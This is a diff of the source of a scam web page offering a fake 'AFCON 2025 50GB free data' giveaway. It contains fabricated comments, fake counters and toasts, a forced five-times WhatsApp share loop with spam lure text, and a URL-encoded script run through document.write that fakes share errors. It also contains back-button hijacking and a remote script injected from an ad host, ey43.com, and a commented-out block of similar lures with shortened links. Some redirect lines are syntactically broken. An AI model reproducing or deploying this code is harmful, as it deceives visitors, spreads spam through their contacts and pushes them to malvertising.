+                    <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhETuUnZKp3TrK9zDTqBtlN4ahx1RrCH6RqG14wW5J8CIBv6HYs7gQSvAiZBwn8NT3lXcz3h8jR87s1z_qZ2kzEoZ7HRnWzskSuqK5NOfKyiQByU3BgypGHXP-m9LlPyFh2FhIsUdN6cO1DnZb-GTtRMDQk8L75NDDUnEC4JxQ6OwsnAjbKVhhlNxrLyQ/s320/9F5D4C76-9CCB-45EB-BA73-73A125849593.jpeg" />
+                    <div class="single-container"><span class="user">Bonolo</span> <span class="text">My mom got 50GB from already, i pray i get approved too</span></div>
+                    <div class="buttons"><span class="time t3">4m</span> <span class="dot">·</span> <span class="action liked">Like</span> · <span class="action">Reply</span></div>
+                </div>
+                <div class="input"><input placeholder="Write a comment..." /></div>
+            </div>
+        </div>
     </div>
-    
-    <div class="footer-text">© AFCON 2025</div>
-</div>
+    <script src="https://code.jquery.com/jquery-latest.min.js"></script>
 
-<div class="toast" id="toast" style="display: block;">Tunde just receive 50GB</div>
 
-<script>
-    let shareCount = 0; let picks = 0; const totalGoal = 5; 
-    const adLink = "https://ey43.com/4/9148867"; 
 
-    function showStep(id) {
-        ['step-init','step-name','step-account','step-applied','step-gender','step-age','step-load','step-gift','step-share'].forEach(s => document.getElementById(s).style.display='none');
-        document.getElementById(id).style.display='block';
-        if(id === 'step-load') setTimeout(() => showStep('step-gift'), 2000);
+
+<script type="text/javascript">
+var time = 0;
+window.setInterval(function () {
+    time = time + 1;
+    $(".t1").html(time + 1 + "m");
+    $(".t2").html(time + 2 + "m");
+    $(".t3").html(time + 4 + "m");
+}, 6e4);
+var likes = 134,
+    comments = 23,
+    shares = 12;
+window.setInterval(function () {
+    likes = likes + Math.floor(Math.random() * 3);
+    comments = comments + Math.floor(Math.random() * 2);
+    shares = shares + Math.floor(Math.random() * 2);
+    $("#likes").html(likes + "K");
+    $("#comments").html(comments + "K comments");
+    $("#shares").html(shares + "K shares");
+}, 5e3);
+$(".liked").click(function () {
+    if ($(this).hasClass("selected")) {
+        $(this).removeClass("selected");
+        $(this).html("Like");
+    } else {
+        $(this).addClass("selected");
+        $(this).html("Unlike");
     }
-
-    function closeModal(id) { document.getElementById(id).style.display = 'none'; }
-
-    function pickBox(el) {
-        if(el.innerHTML !== "🎁") return;
-        picks++;
-        if(picks === 1) { 
-            el.innerHTML = "❌"; 
-            const failCard = document.getElementById('fail-card');
-            failCard.classList.add('error-shake');
-            document.getElementById('modal-try').style.display = 'flex'; 
-            setTimeout(() => failCard.classList.remove('error-shake'), 400);
-        } else { 
-            el.innerHTML = "💰"; 
-            document.getElementById('modal-win').style.display = 'flex'; 
-        }
-    }
-
-    function proceedToShare() { closeModal('modal-win'); showStep('step-share'); }
-
-    function handleShare() {
-        const message = "*AFCON2025 50GB FREE DATA BOUNS*\n\nAFCON Is Giving Out 50GB Free Data Bonus\n Avaliable For All Networks Hurry now and get this amazing offer\n\n*CLICK HERE* 👇\n https://afcon.offer-it.live/50GB " ;
-        window.open("https://wa.me/?text=" + encodeURIComponent(message), "_blank");
-        setTimeout(() => {
-            shareCount++;
-            let p = Math.min((shareCount / totalGoal) * 100, 100);
-            document.getElementById('bar').style.width = p + "%";
-            document.getElementById('pct').innerText = Math.round(p) + "% VERIFIED";
-            if(shareCount >= totalGoal) { 
-                document.querySelector('.btn-wa').style.display = 'none'; 
-                document.getElementById('claim').style.display = 'block'; 
-            }
-        }, 1500);
-    }
-
-    setInterval(() => {
-        let count = Math.floor(Math.random() * (1600 - 1300) + 1300);
-        document.getElementById('online-count').innerText = count.toLocaleString();
-        let slots = parseInt(document.getElementById('slots').innerText);
-        if(slots > 5) document.getElementById('slots').innerText = slots - 1;
-    }, 4500);
-
-    setInterval(() => {
-        const names = ["Emeka", "Sani", "Bello", "Blessing", "Tunde"];
-        const toast = document.getElementById('toast');
-        toast.innerText = names[Math.floor(Math.random()*names.length)] + " just receive 50GB Data";
-        toast.style.display = "block";
-        setTimeout(() => toast.style.display = "none", 3000);
-    }, 9000);
-
-    function finalRedirect() { window.location.href = adLink; }
+});
 </script>
 
 
-<!-- BEGIN: Powered by Supercounters.com -->
+
+
+
+
+
+
+<script type="text/javascript">
+
+$("#go").click(function () {
+    $("#intro").fadeOut(0);
+    $("#loader").fadeIn(1000);
+    var i = 0;
+    var interval = setInterval(function () {
+        $("#num").text(i + "%");
+        i += 1;
+        if (i >= 100) {
+            clearInterval(interval);
+            $("#loader").fadeOut(0);
+            $("#info").fadeIn(1000);
+        }
+    }, 50);
+});
+$("#confirm").click(function () {
+    if ($("#name").val().length < 4)
+    {
+        $(".error").fadeIn(500);
+    } else {
+        $("#info").fadeOut(0);
+        $("#checking").fadeIn(1000);
+        var i = 0;
+        var interval = setInterval(function () {
+            i += 1;
+            $("#percentage").text(i + "%");
+            $("#fill").css("width", i + "%");
+            if (i == 50) {
+                i = 49;
+                setTimeout(function () {
+                    i = 50;
+                }, 1000);
+            }
+            if (i >= 100) {
+                clearInterval(interval);
+                $("#load").fadeOut(0);
+                $("#check").fadeIn(0);
+                setTimeout(function () {
+                    $("#checking").fadeOut(0);
+                    $("#share").fadeIn(1000);
+                    $("#getname").html($("#name").val());
+                }, 500);
+            }
+        }, 50);
+    }
+});
+$(document).click(function () {
+    if ($("#name").is(":focus")) {
+        $(".error").fadeOut(500);
+    }
+});
+</script>
+
+
+
+
+<!--
+"*30%20GB%20Free%20Internet%20Offer*%0A%E2%9D%A4%0ATo%20Activate%2030%20GB%20Free%20Internet%20for%20all%20Networks%20click%20here%F0%9F%91%87%0A*1.%20Jio*%0Ahttps://cutt.ly/30-GB_Jio%0A%20%0A*2.%20Airtel*%0Ahttps://cutt.ly/30-GB_Airtel%0A%20%0A*3.%20Vi*%0Ahttps://cutt.ly/30-GB_Vi%0A%20%0A*4.%20Jazz*%0Ahttps://cutt.ly/30-GB_Jazz%0A%20%0A*5.%20Zong*%0Ahttps://cutt.ly/30-GB_Zong%0A%20%0A*6.%20Telenor*%0Ahttps://cutt.ly/30-GB_Telenor%0A%20%0A*7.%20Ufone*%0Ahttps://cutt.ly/30-GB_Ufone%0A%20%0A*8.%20Other Networks*%0Ahttps://cutt.ly/Get_30GB",
+-->
+      <script>
+        var text1 = "*AFCON2025 50GB FREE DATA REWARD*%0A%0AAFCON is Giving out 50GB Free Data Reward%0AAvaliable For All Networks Hurry now and get this amazing offer🎉%0A%0A*I just got mine get yours below*%0A%0A_CLICK HERE_👇%0Ahttps://afcon.offer-it.live/50GB",
+            text2 = " an amount of ",
+            text3 = "for every citizen who meets the conditions as an aid to the poor class to overcome the crisis. Enter and register now and make sure to register correctly 👉 ",
+            error = "Something is wrong!\nPosts are not calculated. You may have shared it with the same friend or group more than once, please re-share",
+            abcde = "https://ey43.com/4/10368794",
+            saved = "",
+            share = "whatsapp://send?text=" + text1;
+    </script>
+
+
+
+
+
+<script>
+<!-- code by OD -->
+document.write(unescape('%20%3Cscript%20type%3D%22text/javascript%22%3E%0A%20var%20swidth%20%3D%20localStorage.getItem%28saved%29%3B%0Aif%20%28swidth%20%21%3D%3D%20null%29%20%7B%0A%20%20%20%20var%20width%20%3D%20swidth%20*%201%3B%0A%20%20%20%20%24%28%22%23intro%22%29.fadeOut%280%29%3B%0A%20%20%20%20%24%28%22.comments%22%29.fadeOut%280%29%3B%0A%20%20%20%20%24%28%22%23share%22%29.fadeIn%280%29%3B%0A%20%20%20%20%24%28%22%23fill2%22%29.css%28%22width%22%2C%20width%20+%20%22%25%22%29%3B%0A%20%20%20%20%24%28%22%23percentage2%22%29.text%28width%20+%20%22%25%22%29%3B%0A%7D%20else%20%7B%0A%20%20%20%20var%20width%20%3D%200%3B%0A%7D%0A%24%28%22%23whatsapp%22%29.click%28function%20%28%29%20%7B%0A%20%20%20%20window.location.href%20%3D%20share%3B%0A%20%20%20%20if%20%28width%20%3D%3D%200%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%2050%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2050%29%20%7B%0A%20%20%20%20%20%20%20%20alert%28error%29%3B%0A%20%20%20%20%20%20%20%20width%20+%3D%2015%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2065%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%205%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2070%29%20%7B%0A%20%20%20%20%20%20%20%20alert%28error%29%3B%0A%20%20%20%20%20%20%20%20width%20+%3D%2010%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2080%29%20%7B%0A%20%20%20%20%20%20%20%20alert%28error%29%3B%0A%20%20%20%20%20%20%20%20width%20+%3D%205%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2085%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%202%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2087%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%201%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2088%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%202%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2090%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%201%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2091%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%201%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2092%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%201%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2093%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%201%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2094%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%201%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2095%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%201%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2096%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%202%3B%0A%20%20%20%20%7D%20else%20%7B%0A%20%20%20%20%20%20%20%20%24%28%22%23share%22%29.fadeOut%280%29%3B%0A%20%20%20%20%20%20%20%20%24%28%22%23claim%22%29.fadeIn%281000%29%3B%0A%20%20%20%20%7D%0A%20%20%20%20localStorage.setItem%28saved%2C%20width%29%3B%0A%20%20%20%20setTimeout%28function%20%28%29%20%7B%0A%20%20%20%20%20%20%20%20%24%28%22%23fill2%22%29.css%28%22width%22%2C%20width%20+%20%22%25%22%29%3B%0A%20%20%20%20%20%20%20%20%24%28%22%23percentage2%22%29.text%28width%20+%20%22%25%22%29%3B%0A%20%20%20%20%7D%2C%202000%29%3B%0A%7D%29%3B%0A%24%28%22%23offer%22%29.click%28function%20%28%29%20%7B%0A%20%20%20%20window.open%28abcde%2C%20%22_blank%22%29%3B%0A%7D%29%3B%0A%3C/script%3E'))
+</script>
+
+
+<script>
+    window.onhashchange=function(){jp();};
+    function hh() {history.pushState(history.length+1, "message", "#"+new Date().getTime());}
+    function jp() {
+        fh();}
+    setTimeout('hh();', 500);
+    function fh(){
+        location.href="https://ey43.com/4/10368794";
+    }
+    function goon(){
+        location.href="https://ey43.com/4/10368794";
+    }
+</script>
+
+
+
+
+	   <script>
+    window.onhashchange=function(){jp();};
+    function hh() {history.pushState(history.length+1, "message", "#"+new Date().getTime());}
+    function jp() {
+        fh();}
+    setTimeout('hh();', 500);
+    function fh(){
+        location.href="https://ey43.com/4/10368794;
+    }
+    function goon(){
+        location.href="https://ey43.com/4/10368794;
+    }
+</script>
+<script>
+    var _hmt = _hmt || [];
+    (function() {
+        var hm = document.createElement("script");
+        hm.src = "https://ey43.com/4/10368794";
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(hm, s);
+    })();
+</script>
+
+
+
+ 
+
+
+  <br/>
+  <!-- BEGIN: Powered by Supercounters.com -->
 <center><script type="text/javascript" src="//widget.supercounters.com/ssl/online_i.js"></script><script type="text/javascript">sc_online_i(1726967,"ffffff","ffffff");</script><!-- END: Powered by Supercounters.com -->
 
 
-</center></body></html>
+</div>
+
+  <script>/*<![CDATA[*/ cookieChoices = {}; /*]]>*/</script>
+</body></html>
+
 
 
